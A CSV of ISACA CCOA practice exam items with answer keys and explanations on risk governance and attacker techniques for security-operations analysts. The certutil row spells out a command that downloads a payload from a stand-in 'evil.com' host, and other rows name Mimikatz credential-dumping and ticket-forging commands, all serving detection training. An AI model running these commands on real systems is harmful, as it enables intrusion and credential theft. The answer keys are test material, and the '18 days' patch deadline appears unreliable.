"TEST_NAME","TEST_CODE","PASS_SCORE","TOTAL_QUESTIONS","SCORED_QUESTIONS","UNSCORED_QUESTIONS","TIME_MINUTES","DOMAIN","QUESTION","OPTION_A","OPTION_B","OPTION_C","OPTION_D","CORRECT_ANSWER","EXPLANATION"
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'regulatory compliance' in cybersecurity and what frameworks are common?","Regulatory compliance is managed exclusively by legal departments with no technical security involvement","Regulatory compliance frameworks are optional guidelines that organizations may voluntarily adopt","Regulatory compliance requires organizations to meet legal security standards with frameworks including PCI DSS for payment card data HIPAA for healthcare data GDPR for EU personal data and SOX for financial controls","Regulatory compliance means achieving the highest possible security maturity regardless of specific requirements","C","Key cybersecurity compliance frameworks: (1) PCI DSS (Payment Card Industry Data Security Standard) — protects cardholder data; 12 requirements including network segmentation, encryption, access control, monitoring, (2) HIPAA (Health Insurance Portability and Accountability Act) — US healthcare data; requires security risk analysis, access controls, audit logging, (3) GDPR (General Data Protection Regulation) — EU personal data; 72-hour breach notification, data subject rights, privacy by design, (4) SOX (Sarbanes-Oxley) — US public company financial controls including IT general controls, (5) NIST CSF (Cybersecurity Framework) — voluntary framework widely adopted, (6) ISO 27001 — international ISMS standard. CCOA relevance: compliance requirements drive log retention requirements (must keep X months), incident notification SLAs (notify regulator within 72 hours), and minimum security control requirements. Analysts must understand regulatory context when prioritizing breach response. Not optional (regulated frameworks are mandatory for covered entities), requires significant technical implementation."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'security metrics' and what should a SOC measure?","Security metrics are regulatory certifications demonstrating that an organization meets minimum compliance standards","Security metrics are technical benchmarks for evaluating the performance of security hardware appliances","Security metrics are financial ratios calculating the return on investment from security tool purchases","SOC security metrics measure program effectiveness and include detection rate false positive rate mean time to detect and respond alert volume by category and coverage gaps to enable data-driven program improvement","D","SOC key metrics: (1) MTTD (Mean Time to Detect) — attacker dwell time indicator; lower = better, (2) MTTR (Mean Time to Respond/Resolve) — response efficiency; lower = better, (3) Alert volume — total alerts per period; context for analyst workload, (4) False positive rate — % of alerts that are not genuine threats; high FP = alert fatigue, (5) True positive rate (detection rate) — % of actual incidents that generated alerts; low rate = coverage gaps, (6) Escalation rate — % of Tier 1 alerts escalated to Tier 2, (7) Mean time to acknowledge — how quickly analyst starts looking at an alert, (8) Incidents by severity — distribution of critical/high/medium/low, (9) Repeat incidents — same attack type recurring = remediation not working. Use: identify inefficiencies, justify resources, measure improvement. CCOA analysts should track their own metrics and understand how personal performance affects team metrics. Not regulatory certification, not hardware benchmarks, not financial ROI ratios."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'risk register' and how does it inform security operations priorities?","A risk register is a compliance checklist documenting all regulatory requirements and their implementation status","A risk register documents identified risks their likelihood and impact accepted risk decisions and mitigation status allowing SOC analysts to understand which risks the organization has prioritized for monitoring and mitigation","A risk register is a financial ledger tracking security tool purchases and maintenance costs","A risk register is a database of all past security incidents used for historical analysis and trend reporting","B","Risk register: living document maintaining all identified organizational risks. Entries include: risk description, threat source, affected assets, likelihood rating, impact rating, risk score, current controls, residual risk, risk owner, treatment (accept/mitigate/transfer/avoid), treatment status. SOC operational relevance: (1) Highest-risk items should receive most monitoring attention and fastest response SLAs, (2) Accepted risks are known weak points — SOC should have compensating monitoring for these, (3) Risk register informs threat hunting (high likelihood threats should be hunted proactively), (4) When new vulnerabilities emerge, cross-reference with risk register to understand exposure context, (5) After an incident, update risk register to reflect new intelligence. CCOA analysts may not directly maintain risk registers but should understand them to contextualize their work within the organization's broader risk management strategy. Not incident history, not compliance checklist, not financial ledger."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'business continuity' and how does it relate to security incident response?","Business continuity planning is performed after incidents and has no connection to pre-incident security planning","Business continuity is an accounting function ensuring financial operations continue during audits","Business continuity is a legal requirement for publicly traded companies to maintain investor communications","Business continuity planning ensures critical business functions continue during disruptions and connects to incident response through recovery time objectives that drive containment decisions and the need to balance security response with business operations","D","Business continuity / disaster recovery (BC/DR) intersection with security: (1) RTO (Recovery Time Objective) — maximum acceptable downtime; drives containment urgency (if a critical system's RTO is 4 hours, SOC must make containment decisions quickly), (2) RPO (Recovery Point Objective) — maximum data loss tolerance; informs backup strategy, (3) Backup integrity — ransomware attacks specifically target backups; ensuring backups are isolated and immutable is both a BC and security function, (4) BCP invocation — major security incident may trigger BCP (DR site failover, manual business processes), (5) Communication — BCP plans define stakeholder communication during outages, which security incidents may cause. SOC considerations: understand which systems have low RTO/RPO (prioritize protecting and recovering these), coordinate with BC team during major incidents, understand manual fallback procedures so analysts know consequences of taking systems offline. Not accounting, not only for publicly traded, not only post-incident."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'security assessment' vs 'security audit' in cybersecurity?","Both terms are identical in meaning and the choice between them is purely based on organizational terminology preference","A security assessment tests technical controls only while a security audit examines only documentation and policies","A security assessment proactively evaluates security posture and identifies weaknesses while a security audit formally verifies compliance against specific standards or requirements with both providing different value to security operations","Security assessments are performed internally while security audits are always conducted by government regulators","C","Assessment vs. audit: Assessment: proactive evaluation of security posture to find and fix weaknesses before attackers do. Types: vulnerability assessment (scan for known CVEs), penetration test (simulate attacks), red team exercise (full adversarial simulation), security architecture review, cloud configuration review. Output: findings and recommendations for improvement. Performed by: internal team or hired consultants. Not against a specific standard. Audit: formal, structured evaluation against a defined standard (ISO 27001, PCI DSS, SOC 2 criteria). Output: opinion on compliance. Performed by: qualified auditors (internal or external). Must be against specific criteria. SOC relevance: assessment findings become SOC monitoring priorities (vulnerabilities identified → monitor for exploitation attempts). Audit findings may trigger SOC control improvements. Both can reveal security gaps. Not restricted to internal vs. government. Not limited by scope (both can examine technical and administrative controls). Not synonymous — serve different governance purposes."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'third-party risk' and how does it manifest in security operations?","Third-party risk exclusively concerns the risk of vendor invoices being fraudulent or inaccurate","Third-party risk is the risk from vendors partners and suppliers whose security weaknesses can cascade into the organization manifesting in SOC investigations of supply chain compromises vendor access abuse and shadow IT","Third-party risk management is handled entirely by procurement departments with no security involvement","Third-party risk only applies when organizations outsource their entire IT operations to managed service providers","B","Third-party risk types in security operations: (1) Supply chain attacks — vendor software compromised (SolarWinds), hardware with implants, malicious updates, (2) Vendor access abuse — MSP/IT vendor with privileged access to client systems (if MSP is compromised, all clients are compromised), (3) Shared infrastructure — cloud provider breach affecting multiple tenants, (4) Shadow IT — employees using unauthorized third-party SaaS with sensitive data, (5) Third-party data handlers — payment processors, analytics vendors, etc. with access to sensitive data. SOC monitoring for third-party risk: (1) Vendor remote access sessions (privileged access monitoring), (2) Changes made during vendor access windows, (3) Traffic to/from third-party systems, (4) UEBA on service accounts used by vendors, (5) New connections from vendor IP ranges. CCOA analysts should note when incidents involve third-party access — different containment approach. Not just financial fraud risk, requires security team involvement, applies to all organizations with third parties."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'security awareness' measurement and why does it matter for SOC?","Security awareness is measured by the number of annual training courses completed per employee","Security awareness cannot be measured and organizations must assume employees either are or are not security conscious","Security awareness measurement is an HR function that reports to talent management not to the security team","Security awareness effectiveness is measured through phishing simulation click rates reporting rates and incident trends with SOC benefit when high employee reporting rates provide earlier detection of attacks the SOC might otherwise miss","D","Measuring security awareness effectiveness: (1) Phishing simulation click rate — % of employees who clicked simulated phishing link (lower = better awareness), track trend over time and post-training, (2) Phishing reporting rate — % of employees who reported the phishing simulation (higher = better), report button/mechanism usage, (3) Incident reporting — how many suspicious events are employees reporting to SOC? (culture indicator), (4) Help desk tickets — security-related mistakes decreasing?, (5) Repeat offenders — track individuals who repeatedly click phishing simulations for targeted training. SOC benefit from high awareness: (1) Employees become a detection sensor network — they report suspicious emails, phone calls, physical intrusions, (2) Earlier detection of attacks (employee reports suspicious email → SOC investigates → finds real attack before damage), (3) Reduced phishing success rates = fewer incidents for SOC to handle. Training completion alone is insufficient — behavioral change is the goal. Not course completion counting, security owns this (not just HR), measurable through behavioral metrics."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'asset inventory' and why is it foundational to security operations?","Asset inventory is a financial accounting function tracking hardware depreciation for tax purposes","Asset inventory documents all hardware software and data assets enabling SOC analysts to understand the environment scope of incidents and prioritize protection of critical assets they cannot defend what they cannot see","Asset inventory is a one-time activity performed at initial security program setup that does not require ongoing maintenance","Asset inventory is only necessary for organizations subject to compliance audits requiring documented controls","B","Asset inventory: complete and current catalog of all organizational assets. Categories: hardware (servers, workstations, network devices, mobile devices, IoT), software (OS versions, applications, versions), cloud assets (accounts, services, configurations), data (classification, location, custodian). Why foundational: (1) Can't protect what you don't know exists — unmanaged systems have unpatched vulnerabilities, (2) Incident scope — 'how many systems are affected?' requires knowing what exists, (3) Vulnerability management — vulnerability scanner needs asset list to ensure complete coverage, (4) Change detection — new assets appearing in network scans may be attacker-installed systems, (5) Segmentation verification — confirm every asset is in the correct network zone. SOC use: when investigating an alert, immediately consult asset inventory — what is this IP? Who owns it? What runs on it? What data does it hold? Without this context, triage is guesswork. Ongoing maintenance: assets change constantly — must be kept current. Not just financial, not only for compliance, not one-time."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'encryption key management' and what security risks does it present?","Encryption key management is a performance optimization technique reducing the computational load of encryption","Key management is a compliance reporting function documenting which systems use encryption for auditors","Key management governs the lifecycle of cryptographic keys including generation storage rotation and revocation with risks including key compromise allowing decryption of all protected data and key loss causing permanent data inaccessibility","Key management refers to managing access keys for employees to secure physical facilities like server rooms","C","Cryptographic key management lifecycle: Generate (secure random source, appropriate key length), Store (hardware security module HSM, key management service KMS — never store keys with the data they encrypt), Distribute (secure channels, minimize key copies), Use (apply to encrypt/decrypt), Rotate (regular replacement reduces exposure window), Revoke (immediately when compromised), Destroy (secure erasure). Security risks: (1) Key compromise — if private/symmetric key stolen, all data encrypted with it is accessible to attacker (decrypt historical communications, impersonate the key holder), (2) Key loss — permanent data inaccessibility (encrypted data becomes useless if decryption key lost), (3) Weak key generation — insufficient entropy → predictable keys → brute-forceable, (4) Key storage with data — common mistake: encrypt data with key stored in same database → attacker gets both, (5) Key reuse — using same key for everything → single point of failure. CCOA relevance: understanding encryption and key management helps when investigating incidents involving encrypted data, certificate anomalies, or key theft."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'continuous monitoring' in cybersecurity and what does it enable?","Continuous monitoring is the ongoing automated collection and analysis of security-relevant data enabling near-real-time visibility into security posture threat indicators and compliance status rather than point-in-time assessments","Continuous monitoring is a human process where dedicated analysts manually review all system logs every hour","Continuous monitoring is a financial tracking system monitoring cybersecurity expenditure against budget","Continuous monitoring is a regulatory framework requiring annual security assessments for government contractors","A","Continuous monitoring: automated, ongoing security data collection and analysis. Components: (1) Vulnerability scanning (automated recurring scans — not just annual), (2) Configuration monitoring (detect deviation from baselines), (3) Log monitoring (SIEM collecting and analyzing logs in real time), (4) Network monitoring (IDS, flow analysis, anomaly detection), (5) Threat intelligence integration (new IOCs automatically checked against environment), (6) Compliance monitoring (automated checks against control requirements). Enables: (1) Near-real-time threat detection (instead of finding breach months later), (2) Rapid response when thresholds exceeded, (3) Continuous compliance visibility, (4) Trend analysis over time. NIST uses continuous monitoring concept in the Risk Management Framework (RMF) — ongoing authorization rather than periodic re-certification. CCOA: continuous monitoring IS what the SOC does. Understanding its components helps analysts identify where gaps exist. Not manual hourly review, not financial monitoring, not just an annual requirement."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'patch prioritization' and what framework helps categorize urgency?","Patch prioritization is based solely on CVSS score with Critical always patched before High regardless of context","Patch prioritization requires patching all vulnerabilities simultaneously within 30 days of disclosure","Patch prioritization categorizes urgency based on CVSS severity exploitability (EPSS) active exploitation status (CISA KEV) and asset criticality with CISA Known Exploited Vulnerabilities catalog providing the clearest indicator of immediate risk","Patch prioritization means always patching the most recently released vulnerabilities first regardless of severity","C","Patch prioritization decision framework: (1) CISA KEV (Known Exploited Vulnerabilities catalog) — authoritative list of CVEs actively exploited in the wild; KEV vulnerabilities have binding operational directive for federal agencies (18 days to patch); commercial orgs should treat as highest priority, (2) CVSS score — technical severity (0-10); Critical 9-10, High 7-8.9; important but not sufficient alone, (3) EPSS (Exploit Prediction Scoring System) — probability of exploitation in next 30 days based on threat intel and code availability; a Medium CVSS with high EPSS may outrank a Critical CVSS with low EPSS, (4) Asset criticality — internet-facing? Critical business function? Data classification?, (5) Compensating controls — isolated system vs. exposed. Priority tiering: KEV + High CVSS + internet-facing → emergency (24-48 hours). Non-KEV + Medium CVSS + internal → routine maintenance window. CCOA analysts must communicate patch urgency to IT operations with clear risk-based reasoning. Not release date order, not CVSS alone, not all-at-once."
"ISACA CCOA","CCOA","700","150","125","25","240","Cybersecurity Principles and Risk","What is 'security architecture review' and when should it occur?","A security architecture review evaluates proposed or existing system designs for security weaknesses and is most valuable early in the design phase when changes are least costly and security can be built in rather than bolted on","A security architecture review is an annual compliance audit of security controls required by regulators","A security architecture review is a post-breach forensic activity assessing how attackers compromised the environment","A security architecture review is a vendor evaluation process comparing security products for procurement","A","Security architecture review: structured examination of a system's security design. When: (1) New system design (most valuable — fix issues before they're built), (2) Major changes to existing systems, (3) Before cloud migration (security controls translate differently), (4) Post-incident (was there an architectural weakness that enabled the attack?). What's examined: trust boundaries (where does trust level change?), attack surface (what can attackers reach?), authentication and authorization design, data flows and encryption, logging and monitoring coverage, segmentation, failure modes. Output: findings with risk ratings and remediation recommendations. CCOA relevance: while CCOA analysts are primarily operational, understanding architecture helps assess risk during incidents (understand blast radius from architecture) and improve detections (understand where in the architecture monitoring should be placed). Not post-breach forensics (though architecture findings may emerge), not vendor procurement, not regulatory compliance audit."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'living off the land' (LotL) and what makes it particularly challenging to detect?","Living off the land uses legitimate built-in system tools like PowerShell WMI certutil and net.exe for malicious purposes making detection harder because these tools are trusted and their use is often legitimate in normal operations","Living off the land means attackers steal physical server hardware and operate it from their own facility","Living off the land describes attacks that occur in rural or remote locations with limited network monitoring","Living off the land attacks use only open-source tools with no commercial malware making attribution impossible","A","LotL (Living off the Land, LoLBins — Living off the Land Binaries): use of pre-installed, legitimate system tools to perform attack actions. Why it works: (1) Tools are digitally signed by Microsoft/OS vendor — bypass application whitelisting, (2) Legitimate administrative activity looks similar — hard to distinguish malicious from benign, (3) Antivirus doesn't flag legitimate Windows tools. Common LotL tools: PowerShell (execution, download), WMI (execution, persistence), certutil (decode base64, download files), bitsadmin (download files), regsvr32 (execute DLLs/scripts), mshta (execute HTA files), RunDLL32 (execute DLLs), net.exe (user enumeration, lateral movement). Detection approaches: (1) Context matters — certutil running from a user workstation downloading from the internet is suspicious; certutil on an admin workstation for admin task is expected, (2) Parent process analysis — Word spawning PowerShell is highly suspicious, (3) Command line arguments — encode options, download URLs, unusual parameters, (4) Volume and frequency — admin tools running hundreds of times. CCOA analysts must know common LotL tools and their suspicious usage patterns."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'reconnaissance' and what techniques do attackers use?","Reconnaissance is the attacker's information gathering phase using passive techniques like OSINT and active techniques like port scanning to map the target's attack surface before launching attacks","Reconnaissance is a physical security walkthrough of a target facility to identify physical vulnerabilities","Reconnaissance is a post-attack analysis conducted by defenders to understand how an attack succeeded","Reconnaissance is a legal process where attorneys gather evidence before filing cybercrime charges","A","Reconnaissance (MITRE ATT&CK TA0043): gather information about the target to enable effective attacks. Passive (no direct interaction with target): (1) OSINT — LinkedIn (employee names, roles, technologies used), company website (email format, job postings reveal technology stack), DNS records (WHOIS, MX records, subdomains), certificate transparency (find subdomains), (2) Shodan/Censys (find internet-facing services), (3) Historical data (Wayback Machine, cached pages), (4) Dark web (leaked credentials from prior breaches). Active (direct interaction): (1) Port scanning (Nmap — discover open ports and services), (2) Vulnerability scanning (identify unpatched services), (3) Web crawling (find application pages, technologies used), (4) DNS brute force (enumerate subdomains). CCOA detection: active reconnaissance visible in logs (scanning patterns from external IPs, high rate of 404s indicating web crawling). Passive recon leaves NO trace in organization's logs — defender blind spot. Not post-attack analysis, not physical walkthrough, not legal process."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'spear phishing' and how does it differ from generic phishing?","Spear phishing attacks exploit application vulnerabilities while generic phishing targets user psychology","Spear phishing is more automated and less sophisticated than generic phishing requiring less attacker effort","Spear phishing targets specific individuals using personalized information about the victim to create convincing deceptive messages while generic phishing sends identical messages to large numbers of people hoping some click","Spear phishing uses a specialized network scanning technique targeting only specific IP address ranges","C","Generic phishing: mass volume, identical messages, low personalization ('Dear Customer, your account is suspended'). Spear phishing: targeted, researched, personalized. Attacker research: LinkedIn (role, colleagues, projects, manager name), company website (email format, current events), social media (interests, travel, recent activities), previous data breaches (existing credentials). Result: 'Hi [First Name], I'm following up on our conversation at [conference name] last week — I've attached the [specific document type] you requested.' Much harder to detect as phishing. Success rate: significantly higher than generic phishing. Targets: often executives (whaling), finance team (BEC), IT admins (privileged access). CCOA response: email headers reveal targeted nature (specific recipient, personalized content), investigate the full email chain, determine if any credentials were entered. Prevention: security awareness training specifically covering personalized attacks; MFA (even if credentials captured, MFA provides barrier). Not a network scan technique, same attack psychology just more personalized, MORE attacker effort not less."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'pass-the-hash' attack and how is it detected?","Pass-the-hash uses captured NTLM password hashes to authenticate to services without knowing the plaintext password detected by analyzing authentication events for the use of NTLM where Kerberos would be expected or from unusual source systems","Pass-the-hash attacks target web application authentication and are unrelated to Windows NTLM","Pass-the-hash requires the attacker to first crack the hash before it can be used for authentication","Pass-the-hash is a technique for storing passwords as hashed values to improve database security","A","Pass-the-hash (PtH): Windows NTLM authentication sends a challenge that is responded to using the password HASH (not the plaintext password). Therefore, a stolen hash can directly authenticate — no need to crack it first. Technique: attacker dumps NTLM hashes from LSASS memory (Mimikatz: sekurlsa::logonpasswords), uses hash with tools like Impacket's psexec.py or mimikatz sekurlsa::pth. Network perspective: legitimate NTLM authentication. Detection: (1) Windows Security Event 4624 logon type 3 (network logon) with NTLM authentication from systems that normally use Kerberos, (2) NTLM authentication to domain controllers from workstations (DCs prefer Kerberos — NTLM to DC is unusual), (3) Authentication from an account on systems that account has never used before, (4) Lateral movement pattern (same account authenticating to many systems rapidly). Mitigation: use Credential Guard (protect LSASS), disable NTLM where possible, implement MFA. CCOA: look for NTLM where Kerberos expected + unusual source host + subsequent activity. Not password hashing for storage, works differently for web apps, does NOT require cracking."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'double extortion ransomware' and what response challenges does it create?","Double extortion means attackers demand ransom twice once for decryption and once to not attack again","Double extortion ransomware encrypts data using two different encryption algorithms simultaneously","Double extortion is when two different ransomware groups independently attack the same organization","Double extortion ransomware both encrypts victim data and exfiltrates it before encryption then threatens to publish the data if ransom is not paid creating response challenges because paying may not prevent data disclosure and breach notification may be required","D","Double extortion (pioneered by Maze ransomware group ~2019): (1) Phase 1: Exfiltration — steal sensitive data before encrypting (using rclone, MEGAcmd, cloud storage), (2) Phase 2: Encryption — deploy ransomware, encrypt files, (3) Threat: 'Pay to decrypt AND to prevent us from publishing your data on our leak site.' Response challenges: (1) Even if data is recovered from backup (avoiding ransom for decryption), attacker still has the data — second ransom threat still active, (2) Breach notification — stolen data almost certainly constitutes a breach requiring regulatory notification (GDPR, HIPAA, state laws) regardless of whether ransom is paid, (3) Unknown exposure — what data did they exfiltrate? Requires forensic investigation, (4) Attribution — whose data? What's affected? Customer notification?, (5) Payment dilemma — paying ransom doesn't guarantee deletion of stolen data. CCOA relevance: during ransomware IR, investigators must determine if exfiltration occurred BEFORE encryption — look for rclone usage, large outbound transfers in logs before encryption event. Not double-payment, not double-algorithm, not two separate groups."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'adversary-in-the-middle' (AiTM) phishing and how does it bypass MFA?","AiTM attacks compromise the VPN concentrator to intercept traffic after MFA authentication","AiTM phishing uses a reverse proxy to relay credentials and MFA tokens in real time between the victim and the legitimate service allowing attackers to capture authenticated session cookies after MFA is completed","AiTM phishing requires physical access to network hardware to install packet capture equipment","AiTM phishing uses social engineering to convince MFA administrators to disable two-factor authentication","B","AiTM (Adversary-in-the-Middle, aka real-time phishing proxy): defeats MFA by sitting between victim and legitimate service. How: (1) Victim receives phishing link → directed to AiTM proxy (looks like real login page), (2) Victim enters credentials → proxy forwards to real service, (3) Real service requests MFA → proxy displays MFA challenge to victim, (4) Victim completes MFA → proxy forwards to real service, (5) Real service authenticates → issues session cookie, (6) Proxy captures session cookie. Now attacker has authenticated session cookie — MFA already completed. Tools: Evilginx2, Modlishka, Muraena. Detection: (1) Unusual user agent strings in authentication logs, (2) Authentication from unexpected location followed by session used from different location, (3) Token replay anomalies (Conditional Access in Azure AD detects), (4) Rapid access after authentication from new IP. Mitigation: phishing-resistant MFA (FIDO2/WebAuthn — cryptographically binds to the legitimate domain; AiTM proxy cannot replicate this). CCOA: when investigating compromised accounts with MFA enabled, consider AiTM as possible attack vector."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'DLL hijacking' and how is it used for persistence and privilege escalation?","DLL hijacking is a software development technique for overriding library functions in third-party applications","DLL hijacking is a physical security technique where attackers replace USB dongles with malicious versions","DLL hijacking places a malicious DLL in a directory searched before the legitimate DLL location causing vulnerable applications to load the malicious code with the application's privileges potentially at SYSTEM level","DLL hijacking is a network attack that intercepts DLL download requests and substitutes malicious files","C","DLL hijacking (MITRE ATT&CK T1574.001): Windows applications search for DLLs in a defined order (DLL search order: application directory → system32 → system → Windows → current directory → PATH directories). Attack: (1) Find application with missing DLL or insecure search path, (2) Place malicious DLL named identically to expected DLL in a searched directory that comes before the legitimate one, (3) When application runs, it loads the malicious DLL instead. Privilege escalation: if the vulnerable application runs as SYSTEM (Windows service) and attacker can write to a searched directory, attacker's DLL runs as SYSTEM. Persistence: DLL in autorun application's search path executes every time application runs. Detection: (1) Unexpected DLLs loaded by applications (monitor DLL loads with Sysmon Event ID 7), (2) DLL files in unusual directories (temp folders, user profile directories), (3) Process Monitor can reveal DLL search order failures being exploited. CCOA: Sysmon is particularly valuable for detecting DLL hijacking. Not software override technique, not network interception, not physical attack."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'MFA fatigue attack' (MFA bombing) and how can organizations defend against it?","MFA fatigue can be defeated by implementing longer authentication timeouts that give users more time","MFA fatigue is caused by using MFA on too many systems creating password reset helpdesk tickets","MFA fatigue attacks exploit zero-day vulnerabilities in authentication app codebases","MFA fatigue floods a victim with push authentication requests hoping they approve one out of frustration with defenses including number matching requiring users to enter a code shown in the login screen and limiting push attempts","D","MFA fatigue (push bombing): attacker has victim's credentials (from phishing or prior breach). Attack: (1) Repeatedly attempt authentication to trigger push notification to victim's authenticator app, (2) Victim receives many 'Someone is signing in to your account, approve?' notifications, (3) Attacker may call victim pretending to be IT support ('we need you to approve an auth request'), (4) Out of frustration or social engineering, victim approves → attacker authenticated. Defenses: (1) Number matching — user must enter a code displayed in the login UI into the authenticator app; attacker doesn't see the number → cannot tell victim what to type, (2) Additional context — authenticator app shows login location and app; trained users notice anomalies, (3) Push rate limiting — limit push attempts per period; lockout after N attempts, (4) FIDO2 phishing-resistant MFA (WebAuthn/hardware keys) — immune to fatigue and phishing, (5) Conditional Access — block authentications from unusual locations even with valid MFA. Detection: multiple failed MFA push attempts followed by successful one → investigate. CCOA: recognize MFA fatigue patterns in authentication logs."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'LOTL' binary certutil.exe and how do attackers abuse it?","Certutil.exe is a network scanning tool built into Windows for certificate validation of network traffic","Certutil.exe is a Windows certificate utility that attackers abuse for downloading files decoding base64 and installing certificates making it a common LotL vector that should trigger monitoring when used with download or decode flags","Certutil.exe is a security tool designed specifically for detecting certificate-based malware on endpoints","Certutil.exe is only relevant for certificate authorities and cannot be abused on standard workstations","B","Certutil.exe: legitimate Windows certificate management utility. Attacker abuse (LotL): (1) File download — certutil.exe -urlcache -f http://evil.com/payload.exe payload.exe (downloads file using HTTP); bypasses many proxy controls that block PowerShell downloads, (2) Base64 decode — certutil.exe -decode encoded.txt decoded.exe (decode base64-encoded payload); evades detection of encoded content, (3) Certificate store manipulation — install rogue certificates for MITM or code signing, (4) Hash calculation — certutil -hashfile (often used to verify downloads are correct). Detection triggers: (1) certutil with -urlcache or -f flags followed by URL, (2) certutil with -decode flag, (3) certutil run from unexpected locations (user temp directory), (4) certutil with unusual parent process (Word spawning certutil), (5) Network connection from certutil.exe process. CCOA: create SIEM detection rule: process name = certutil.exe AND (command line contains '-urlcache' OR command line contains '-decode'). This is a specific detection with high fidelity."
"ISACA CCOA","CCOA","700","150","125","25","240","Adversarial Tactics, Techniques, and Procedures","What is 'Golden Ticket' attack and what makes it particularly severe?","Golden Ticket attacks target web applications by forging JWT authentication tokens","Golden Ticket creates a forged Kerberos TGT using the KRBTGT account hash allowing attackers persistent domain-wide access for up to 10 years even after password resets of regular accounts because the forgery doesn't require domain controller verification","Golden Ticket is a software licensing tool that provides unlimited access to Microsoft products","Golden Ticket is a pass-the-hash technique specific to local administrator accounts","B","Golden Ticket attack (MITRE ATT&CK T1558.001): requires the KRBTGT account hash (KDC service account). Attack flow: (1) Attacker compromises Domain Controller or uses DCSync to extract KRBTGT hash, (2) Using Mimikatz kerberos::golden, craft a forged TGT for any user (even nonexistent) with any group memberships (Domain Admin), (3) Use forged ticket to access any domain resource. Why severe: (1) Valid for 10+ years (default) — attacker maintains access indefinitely, (2) Doesn't require live DC contact for validation — even offline domain can be attacked, (3) Persists through user password resets (only depends on KRBTGT hash), (4) Hard to detect — forged ticket looks like legitimate ticket. Detection: (1) Event ID 4769 — service ticket requested for sensitive accounts from unexpected systems, (2) Tickets with unusually long lifetime, (3) Tickets for nonexistent accounts, (4) Microsoft Advanced Threat Analytics (ATA) / Defender for Identity detects anomalies. Remediation: change KRBTGT password TWICE (invalidates all existing tickets, including Golden Tickets). CCOA: severe incident — DC compromise indicator; treat as maximum severity."
